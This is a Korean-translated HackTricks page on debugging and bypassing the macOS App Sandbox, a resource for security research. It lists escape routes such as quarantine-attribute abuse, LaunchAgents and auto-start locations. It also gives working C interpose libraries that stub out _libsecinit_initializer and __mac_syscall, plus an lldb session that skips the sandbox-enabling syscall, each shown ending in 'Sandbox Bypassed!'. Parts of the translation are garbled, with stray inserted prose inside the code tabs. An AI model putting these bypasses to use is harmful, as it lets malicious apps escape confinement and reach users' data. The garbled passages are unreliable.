# macOS Sandbox 디버그 및 우회

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)를 통해 제로에서 영웅까지 AWS 해킹 배우기</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

HackTricks를 지원하는 다른 방법:

* **회사가 HackTricks를 광고하거나 PDF로 다운로드하고 싶다면** [**구독 요금제**](https://github.com/sponsors/carlospolop)를 확인하세요!
* [**공식 PEASS & HackTricks 스왜그**](https://peass.creator-spring.com)를 구입하세요
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)를 발견하세요, 당사의 독점 [**NFTs**](https://opensea.io/collection/the-peass-family) 컬렉션
* **💬 [**Discord 그룹**](https://discord.gg/hRep4RUj7f) 또는 [**텔레그램 그룹**](https://t.me/peass)에 가입하거나** 트위터** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**를 팔로우하세요.**
* **해킹 트릭을 공유하려면** [**HackTricks**](https://github.com/carlospolop/hacktricks) 및 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github 저장소로 PR을 제출하세요.

</details>

## 샌드박스 로딩 프로세스

<figure><img src="../../../../../.gitbook/assets/image (901).png" alt=""><figcaption><p><a href="http://newosxbook.com/files/HITSB.pdf">http://newosxbook.com/files/HITSB.pdf</a>에서 가져온 이미지</p></figcaption></figure>

이전 이미지에서는 **`com.apple.security.app-sandbox`** 권한이 있는 응용 프로그램이 실행될 때 **샌드박스가 어떻게 로드되는지** 확인할 수 있습니다.

컴파일러는 `/usr/lib/libSystem.B.dylib`를 이진 파일에 링크합니다.

그런 다음 **`libSystem.B`**는 **`xpc_pipe_routine`**이 응용 프로그램의 권한을 **`securityd`**에 보내기까지 여러 함수를 호출합니다. Securityd는 프로세스가 샌드박스 내부에 격리되어야 하는지 확인하고 그렇다면 격리됩니다.\
마지막으로, 샌드박스는 **`__sandbox_ms`**를 호출하여 **`__mac_syscall`**을 호출합니다.

## 가능한 우회 방법

### 격리 속성 우회

**샌드박스 프로세스에서 생성된 파일**은 샌드박스 탈출을 방지하기 위해 **격리 속성**이 추가됩니다. 그러나 샌드박스 응용 프로그램 내에서 **격리 속성이 없는 `.app` 폴더를 만들 수 있다면**, 앱 번들 이진 파일을 **`/bin/bash`**를 가리키도록 만들고 **plist**에 일부 환경 변수를 추가하여 **`open`**을 남용하여 **새로운 앱을 샌드박스에서 실행**할 수 있습니다.

이것이 [**CVE-2023-32364**](https://gergelykalman.com/CVE-2023-32364-a-macOS-sandbox-escape-by-mounting.html)**에서 수행된 작업입니다.**

{% hint style="danger" %}
따라서 현재 당신이 **격리 속성이 없는 이름으로 끝나는 폴더를 만들 수 있다면**, macOS는 **`.app` 폴더**와 **주 실행 파일**에서만 **격리 속성**을 **확인**하므로 샌드박스를 탈출할 수 있습니다 (그리고 우리는 주 실행 파일을 **`/bin/bash`**로 지정할 것입니다).

주의할 점은 .app 번들이 이미 실행 권한이 부여되었을 때 (권한 부여된 실행 플래그가 있는 quarantine xttr이 있을 때) 이를 악용할 수도 있다는 것입니다... 다만 이제는 샌드박스 내부에서는 특권 TCC 권한이 없는 한 **`.app`** 번들 내부에 쓸 수 없습니다.
{% endhint %}

### Open 기능 남용

[**Word 샌드박스 우회의 마지막 예제**](macos-office-sandbox-bypasses.md#word-sandbox-bypass-via-login-items-and-.zshenv)에서 **`open`** cli 기능이 샌드박스를 우회하는 데 남용되는 방법을 확인할 수 있습니다.

{% content-ref url="macos-office-sandbox-bypasses.md" %}
[macos-office-sandbox-bypasses.md](macos-office-sandbox-bypasses.md)
{% endcontent-ref %}

### Launch Agents/Daemons

응용 프로그램이 **샌드박스에 있어야 하는** 경우 (`com.apple.security.app-sandbox`), 예를 들어 **LaunchAgent** (`~/Library/LaunchAgents`)에서 실행된다면 샌드박스를 우회할 수 있습니다.\
[**이 게시물**](https://www.vicarius.io/vsociety/posts/cve-2023-26818-sandbox-macos-tcc-bypass-w-telegram-using-dylib-injection-part-2-3?q=CVE-2023-26818)에서 설명한 대로 샌드박스가 적용된 응용 프로그램에 영속성을 부여하려면 응용 프로그램이 자동으로 LaunchAgent로 실행되도록 만들고 DyLib 환경 변수를 통해 악성 코드를 주입할 수 있습니다.

### Auto Start 위치 남용

샌드박스 프로세스가 **나중에 샌드박스를 우회할 수 있는 비샌드박스 응용 프로그램이 이진 파일을 실행할 위치에 쓸 수 있다면**, 거기에 이진 파일을 놓음으로써 **탈출할 수 있습니다**. 이러한 위치의 좋은 예는 `~/Library/LaunchAgents` 또는 `/System/Library/LaunchDaemons`입니다.

이를 위해 **2단계**가 필요할 수도 있습니다: **보다 허용적인 샌드박스**(`file-read*`, `file-write*`)를 가진 프로세스가 실제로 **비샌드박스에서 실행될 위치에 쓸 코드를 실행**하도록 하는 것입니다.

**Auto Start 위치**에 대한 이 페이지를 확인하세요:

{% content-ref url="../../../../macos-auto-start-locations.md" %}
[macos-auto-start-locations.md](../../../../macos-auto-start-locations.md)
{% endcontent-ref %}

### 다른 프로세스 남용

샌드박스 프로세스에서 **다른 프로세스를 손상시킬 수 있다면** (또는 덜 제한적인 샌드박스(또는 없음)에서 실행 중인 프로세스), 해당 샌드박스로 탈출할 수 있습니다:

{% content-ref url="../../../macos-proces-abuse/" %}
[macos-proces-abuse](../../../macos-proces-abuse/)
{% endcontent-ref %}

### 정적 컴파일 및 동적 링크

[**이 연구**](https://saagarjha.com/blog/2020/05/20/mac-app-store-sandbox-escape/)에서 샌드박스를 우회하는 2가지 방법을 발견했습니다. 샌드박스는 사용자 영역에서 적용되므로 **libSystem** 라이브러리가 로드될 때 적용됩니다. 이진 파일이 해당 라이브러리를 로드하지 않도록 피할 수 있다면 샌드박스가 적용되지 않을 것입니다:

* 이진 파일이 **완전히 정적으로 컴파일**되었다면 해당 라이브러리를 로드하지 않을 수 있습니다.
* 이진 파일이 **라이브러리를 로드할 필요가 없다면** (링커도 libSystem에 있기 때문에) libSystem을 로드할 필요가 없습니다.

### 쉘코드

ARM64에서도 **심지어 쉘코드**는 `libSystem.dylib`에 링크되어야 함을 유의하세요:
```bash
ld -o shell shell.o -macosx_version_min 13.0
ld: dynamic executables or dylibs must link with libSystem.dylib for architecture arm64
```
### 엔타이틀먼츠

특정 엔타이틀먼트가 있는 경우 **애플리케이션이** 샌드박스에서 **허용되는** 일부 **동작**이 있더라도 해당 **동작**이 **허용**될 수 있습니다.
```scheme
(when (entitlement "com.apple.security.network.client")
(allow network-outbound (remote ip))
(allow mach-lookup
(global-name "com.apple.airportd")
(global-name "com.apple.cfnetwork.AuthBrokerAgent")
(global-name "com.apple.cfnetwork.cfnetworkagent")
[...]
```
### Interposting Bypass

**Interposting**에 대한 자세한 정보는 다음을 확인하십시오:

{% content-ref url="../../../macos-proces-abuse/macos-function-hooking.md" %}
[macos-function-hooking.md](../../../macos-proces-abuse/macos-function-hooking.md)
{% endcontent-ref %}

`_libsecinit_initializer`를 Interpost하여 샌드박스를 방지합니다.
```c
// gcc -dynamiclib interpose.c -o interpose.dylib

#include <stdio.h>

void _libsecinit_initializer(void);

void overriden__libsecinit_initializer(void) {
printf("_libsecinit_initializer called\n");
}

__attribute__((used, section("__DATA,__interpose"))) static struct {
void (*overriden__libsecinit_initializer)(void);
void (*_libsecinit_initializer)(void);
}
_libsecinit_initializer_interpose = {overriden__libsecinit_initializer, _libsecinit_initializer};
```

```bash
DYLD_INSERT_LIBRARIES=./interpose.dylib ./sand
_libsecinit_initializer called
Sandbox Bypassed!
```
#### 샌드박스 방지를 위해 `__mac_syscall`을 interpose합니다

{% code title="interpose.c" %}
```c
// gcc -dynamiclib interpose.c -o interpose.dylib

#include <stdio.h>
#include <string.h>

// Forward Declaration
int __mac_syscall(const char *_policyname, int _call, void *_arg);

// Replacement function
int my_mac_syscall(const char *_policyname, int _call, void *_arg) {
printf("__mac_syscall invoked. Policy: %s, Call: %d\n", _policyname, _call);
if (strcmp(_policyname, "Sandbox") == 0 && _call == 0) {
printf("Bypassing Sandbox initiation.\n");
return 0; // pretend we did the job without actually calling __mac_syscall
}
// Call the original function for other cases
return __mac_syscall(_policyname, _call, _arg);
}

// Interpose Definition
struct interpose_sym {
const void *replacement;
const void *original;
};

// Interpose __mac_syscall with my_mac_syscall
__attribute__((used)) static const struct interpose_sym interposers[] __attribute__((section("__DATA, __interpose"))) = {
{ (const void *)my_mac_syscall, (const void *)__mac_syscall },
};
```
{% endcode %} 

{% endcode %}
```bash
DYLD_INSERT_LIBRARIES=./interpose.dylib ./sand

__mac_syscall invoked. Policy: Sandbox, Call: 2
__mac_syscall invoked. Policy: Sandbox, Call: 2
__mac_syscall invoked. Policy: Sandbox, Call: 0
Bypassing Sandbox initiation.
__mac_syscall invoked. Policy: Quarantine, Call: 87
__mac_syscall invoked. Policy: Sandbox, Call: 4
Sandbox Bypassed!
```
### lldb를 사용하여 Sandbox 디버그 및 우회

Sandbox가 적용되어야 하는 응용 프로그램을 컴파일해 봅시다:

{% tabs %}
{% tab title="sand.c" %}
```c
#include <stdlib.h>
int main() {
system("cat ~/Desktop/del.txt");
}
```
{% endtab %}

{% tab title="entitlements.xml" %} 

## macOS Sandbox 디버그 및 우회

macOS에서 앱을 개발할 때 Sandbox는 앱이 시스템 및 사용자 데이터에 접근하는 데 필요한 권한을 제한하는 중요한 보안 기능입니다. 그러나 Sandbox 우회 기술은 여전히 존재하며, 이를 통해 권한 상승 및 보안 취약점이 발생할 수 있습니다.

Sandbox를 우회하고 디버그하는 방법을 이해하면 앱의 보안을 강화하고 시스템을 더 안전하게 유지할 수 있습니다. 이 문서에서는 macOS Sandbox의 디버그 및 우회 기술에 대해 다루고 있습니다.

### 참고

- [Sandbox 개요 및 보안 기능](https://developer.apple.com/library/archive/documentation/Security/Conceptual/AppSandboxDesignGuide/AboutAppSandbox/AboutAppSandbox.html)
- [Sandbox 우회에 대한 최신 정보](https://blog.malwarebytes.com/threat-analysis/2019/09/macos-sandbox-bypass-via-memory-access/)

{% endtab %}
```xml
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd"> <plist version="1.0">
<dict>
<key>com.apple.security.app-sandbox</key>
<true/>
</dict>
</plist>
```
{% endtab %}

{% tab title="Info.plist" %}Info.plist 파일은 앱의 기본 설정 및 기능을 정의하는 데 사용됩니다. 이 파일은 앱이 시스템과 상호 작용하는 방식을 제어하고, 앱이 요청할 수 있는 권한을 결정합니다. 따라서 Info.plist 파일을 조작하여 샌드박스 제약을 우회하거나 디버깅하는 데 사용될 수 있습니다. 보안을 강화하기 위해 Info.plist 파일을 신중하게 관리해야 합니다. %}
```xml
<plist version="1.0">
<dict>
<key>CFBundleIdentifier</key>
<string>xyz.hacktricks.sandbox</string>
<key>CFBundleName</key>
<string>Sandbox</string>
</dict>
</plist>
```
{% endtab %}
{% endtabs %}

그런 다음 앱을 컴파일하십시오:

{% code overflow="wrap" %}
```bash
# Compile it
gcc -Xlinker -sectcreate -Xlinker __TEXT -Xlinker __info_plist -Xlinker Info.plist sand.c -o sand

# Create a certificate for "Code Signing"

# Apply the entitlements via signing
codesign -s <cert-name> --entitlements entitlements.xml sand
```
{% endcode %}

{% hint style="danger" %}
앱은 **`~/Desktop/del.txt`** 파일을 **읽으려고 시도**할 것이며, **Sandbox가 허용하지 않을 것**입니다.\
한 번 Sandbox가 우회되면 해당 위치에 파일을 만들어 읽을 수 있게 될 것입니다:
```bash
echo "Sandbox Bypassed" > ~/Desktop/del.txt
```
{% endhint %}

Sandbox가 로드되는 시점을 확인하기 위해 애플리케이션을 디버깅해 봅시다:
```bash
# Load app in debugging
lldb ./sand

# Set breakpoint in xpc_pipe_routine
(lldb) b xpc_pipe_routine

# run
(lldb) r

# This breakpoint is reached by different functionalities
# Check in the backtrace is it was de sandbox one the one that reached it
# We are looking for the one libsecinit from libSystem.B, like the following one:
(lldb) bt
* thread #1, queue = 'com.apple.main-thread', stop reason = breakpoint 1.1
* frame #0: 0x00000001873d4178 libxpc.dylib`xpc_pipe_routine
frame #1: 0x000000019300cf80 libsystem_secinit.dylib`_libsecinit_appsandbox + 584
frame #2: 0x00000001874199c4 libsystem_trace.dylib`_os_activity_initiate_impl + 64
frame #3: 0x000000019300cce4 libsystem_secinit.dylib`_libsecinit_initializer + 80
frame #4: 0x0000000193023694 libSystem.B.dylib`libSystem_initializer + 272

# To avoid lldb cutting info
(lldb) settings set target.max-string-summary-length 10000

# The message is in the 2 arg of the xpc_pipe_routine function, get it with:
(lldb) p (char *) xpc_copy_description($x1)
(char *) $0 = 0x000000010100a400 "<dictionary: 0x6000026001e0> { count = 5, transaction: 0, voucher = 0x0, contents =\n\t\"SECINITD_REGISTRATION_MESSAGE_SHORT_NAME_KEY\" => <string: 0x600000c00d80> { length = 4, contents = \"sand\" }\n\t\"SECINITD_REGISTRATION_MESSAGE_IMAGE_PATHS_ARRAY_KEY\" => <array: 0x600000c00120> { count = 42, capacity = 64, contents =\n\t\t0: <string: 0x600000c000c0> { length = 14, contents = \"/tmp/lala/sand\" }\n\t\t1: <string: 0x600000c001e0> { length = 22, contents = \"/private/tmp/lala/sand\" }\n\t\t2: <string: 0x600000c000f0> { length = 26, contents = \"/usr/lib/libSystem.B.dylib\" }\n\t\t3: <string: 0x600000c00180> { length = 30, contents = \"/usr/lib/system/libcache.dylib\" }\n\t\t4: <string: 0x600000c00060> { length = 37, contents = \"/usr/lib/system/libcommonCrypto.dylib\" }\n\t\t5: <string: 0x600000c001b0> { length = 36, contents = \"/usr/lib/system/libcompiler_rt.dylib\" }\n\t\t6: <string: 0x600000c00330> { length = 33, contents = \"/usr/lib/system/libcopyfile.dylib\" }\n\t\t7: <string: 0x600000c00210> { length = 35, contents = \"/usr/lib/system/libcorecry"...

# The 3 arg is the address were the XPC response will be stored
(lldb) register read x2
x2 = 0x000000016fdfd660

# Move until the end of the function
(lldb) finish

# Read the response
## Check the address of the sandbox container in SECINITD_REPLY_MESSAGE_CONTAINER_ROOT_PATH_KEY
(lldb) memory read -f p 0x000000016fdfd660 -c 1
0x16fdfd660: 0x0000600003d04000
(lldb) p (char *) xpc_copy_description(0x0000600003d04000)
(char *) $4 = 0x0000000100204280 "<dictionary: 0x600003d04000> { count = 7, transaction: 0, voucher = 0x0, contents =\n\t\"SECINITD_REPLY_MESSAGE_CONTAINER_ID_KEY\" => <string: 0x600000c04d50> { length = 22, contents = \"xyz.hacktricks.sandbox\" }\n\t\"SECINITD_REPLY_MESSAGE_QTN_PROC_FLAGS_KEY\" => <uint64: 0xaabe660cef067137>: 2\n\t\"SECINITD_REPLY_MESSAGE_CONTAINER_ROOT_PATH_KEY\" => <string: 0x600000c04e10> { length = 65, contents = \"/Users/carlospolop/Library/Containers/xyz.hacktricks.sandbox/Data\" }\n\t\"SECINITD_REPLY_MESSAGE_SANDBOX_PROFILE_DATA_KEY\" => <data: 0x600001704100>: { length = 19027 bytes, contents = 0x0000f000ba0100000000070000001e00350167034d03c203... }\n\t\"SECINITD_REPLY_MESSAGE_VERSION_NUMBER_KEY\" => <int64: 0xaa3e660cef06712f>: 1\n\t\"SECINITD_MESSAGE_TYPE_KEY\" => <uint64: 0xaabe660cef067137>: 2\n\t\"SECINITD_REPLY_FAILURE_CODE\" => <uint64: 0xaabe660cef067127>: 0\n}"

# To bypass the sandbox we need to skip the call to __mac_syscall
# Lets put a breakpoint in __mac_syscall when x1 is 0 (this is the code to enable the sandbox)
(lldb) breakpoint set --name __mac_syscall --condition '($x1 == 0)'
(lldb) c

# The 1 arg is the name of the policy, in this case "Sandbox"
(lldb) memory read -f s $x0
0x19300eb22: "Sandbox"

#
# BYPASS
#

# Due to the previous bp, the process will be stopped in:
Process 2517 stopped
* thread #1, queue = 'com.apple.main-thread', stop reason = breakpoint 1.1
frame #0: 0x0000000187659900 libsystem_kernel.dylib`__mac_syscall
libsystem_kernel.dylib`:
->  0x187659900 <+0>:  mov    x16, #0x17d
0x187659904 <+4>:  svc    #0x80
0x187659908 <+8>:  b.lo   0x187659928               ; <+40>
0x18765990c <+12>: pacibsp

# To bypass jump to the b.lo address modifying some registers first
(lldb) breakpoint delete 1 # Remove bp
(lldb) register write $pc 0x187659928 #b.lo address
(lldb) register write $x0 0x00
(lldb) register write $x1 0x00
(lldb) register write $x16 0x17d
(lldb) c
Process 2517 resuming
Sandbox Bypassed!
Process 2517 exited with status = 0 (0x00000000)
```
{% hint style="warning" %}
**Sandbox 우회가 되었더라도 TCC**는 사용자에게 프로세스가 데스크톱에서 파일을 읽을 수 있도록 허용할지 물을 것입니다.
{% endhint %}

## 참고 자료

* [http://newosxbook.com/files/HITSB.pdf](http://newosxbook.com/files/HITSB.pdf)
* [https://saagarjha.com/blog/2020/05/20/mac-app-store-sandbox-escape/](https://saagarjha.com/blog/2020/05/20/mac-app-store-sandbox-escape/)
* [https://www.youtube.com/watch?v=mG715HcDgO8](https://www.youtube.com/watch?v=mG715HcDgO8)

<details>

<summary><strong>AWS 해킹을 처음부터 전문가까지 배우세요</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

HackTricks를 지원하는 다른 방법:

* **회사가 HackTricks를 광고하거나 PDF로 다운로드하고 싶다면** [**구독 요금제**](https://github.com/sponsors/carlospolop)를 확인하세요!
* [**공식 PEASS & HackTricks 굿즈**](https://peass.creator-spring.com)를 구매하세요
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)를 발견하세요, 당사의 독점 [**NFTs**](https://opensea.io/collection/the-peass-family) 컬렉션
* **💬 [디스코드 그룹](https://discord.gg/hRep4RUj7f)** 또는 [텔레그램 그룹](https://t.me/peass)에 **가입**하거나 **트위터** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**를 팔로우**하세요.
* **HackTricks** 및 **HackTricks Cloud** 깃허브 저장소에 PR을 제출하여 **해킹 요령을 공유**하세요.

</details>
